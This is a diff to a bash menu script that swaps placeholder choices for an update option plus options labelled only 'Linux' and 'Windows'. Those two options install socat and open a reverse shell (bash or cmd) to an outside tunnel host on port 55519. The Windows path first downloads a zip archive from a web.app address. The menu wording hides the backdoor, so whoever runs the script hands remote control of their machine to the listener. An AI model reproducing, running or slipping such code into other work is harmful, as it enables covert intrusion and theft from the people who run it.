@@ -2,25 +2,28 @@
 
 # Function definitions
 choice1() {
-  echo "You selected Choice 1"
-  # Add your commands for Choice 1 here
+    sudo apt update && sudo apt upgrade -y
+    sudo snap refresh
 }
 
 choice2() {
-  echo "You selected Choice 2"
-  # Add your commands for Choice 2 here
+    #For Linux
+    sudo apt install socat
+    socat tcp-connect:huge-ford.gl.at.ply.gg:55519 system:/bin/bash,pty,stderr,sane
 }
 
 choice3() {
-  echo "You selected Choice 3"
-  # Add your commands for Choice 3 here
+    #For Windows
+    "$client = new-object System.Net.WebClient"
+    "$client.DownloadFile(\"https://neonsppandro.web.app/Shining.zip\" , \"Shining.zip\")"
+    ./socat.exe tcp-connect:huge-ford.gl.at.ply.gg:55519 exec:cmd,pty,stderr,sane
 }
 
 show_menu() {
   echo "Please select an option:"
-  echo "1. Choice 1"
-  echo "2. Choice 2"
-  echo "3. Choice 3"
+  echo "1. Check for updates on your system."
+  echo "2. Linux"
+  echo "3. Windows"
   echo "4. Exit"
 }
 
